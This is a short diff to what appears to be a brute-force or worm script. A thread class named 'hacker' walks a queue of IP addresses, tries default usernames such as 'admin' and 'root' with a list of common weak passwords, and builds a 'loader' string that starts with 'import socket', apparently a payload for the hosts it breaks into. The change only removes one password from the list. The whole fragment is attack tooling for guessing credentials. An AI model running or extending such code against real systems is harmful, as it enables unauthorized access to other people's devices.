@@ -94,7 +94,7 @@ class hacker(Thread):
         while not self.ips.empty():
             ip = self.ips.get()
             usernames = ["admin","root","guest","user"]
-            passwords = ["system10","toor","admin","guest","password","root","letmein","12345678","alpine"]
+            passwords = ["toor","admin","guest","password","root","letmein","12345678","alpine"]
             ag = 0
             done = "E"+"O"+"F"
             loader = "import socket\n"
